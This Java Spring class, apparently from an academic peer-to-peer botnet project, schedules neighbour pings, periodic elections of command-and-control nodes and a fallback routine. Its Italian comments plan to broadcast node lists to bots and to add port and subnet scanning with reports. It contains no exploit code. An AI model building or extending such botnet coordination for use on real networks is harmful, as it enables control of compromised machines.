package cs.sii.schedule.net;

import java.security.PublicKey;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import cs.sii.bot.action.Behavior;
import cs.sii.config.onLoad.Config;
import cs.sii.control.command.Commando;
import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.service.connection.NetworkService;

@Component
public class ScheduledTasksNet {

	private static final Logger log = LoggerFactory.getLogger(ScheduledTasksNet.class);

	private static final SimpleDateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
	@Autowired
	private Commando cmm;
	@Autowired
	private NetworkService nServ;
	@Autowired
	private Config configEngine;
	@Autowired
	private Behavior botB;
	

	
	@Scheduled(initialDelay=100000,fixedRate = 100000)
	public void pingNeighbours() {
			botB.pingToNeighbours();
	}
	
	
	@Scheduled(initialDelay=50000, fixedRate = 220000)
	public void electionDay() {
		if (configEngine.isCommandandconquerStatus()){
			cmm.startElection();
		}
	}
	
	
	@Scheduled(initialDelay=600000, fixedRate = 320000)
	public void rollBack() {
		if (!configEngine.isCommandandconquerStatus()){
				if(nServ.getCounterCeCMemory()==1)
					cmm.legacy();
		}
	}
	
	
	@Scheduled(fixedRate = 500000)
	public void pingVicinato() {

	
		log.info("The time is now {}", dateFormat.format(new Date()));
	}

	// se sei il cec ricalcola il grafo sulla base del vecchio con Updatenetwork
	// ogni tot tempo e se la lista dei nodi è cambiata
	// poi spamma la list anuova

	// eleggere nuovo gruppo di cec e spammare ai bot il nuovo gruppo da cui
	// eseguire chiamate

	// Scan porte e sottorete + invio report?= sarebbe sgravo se fatto


}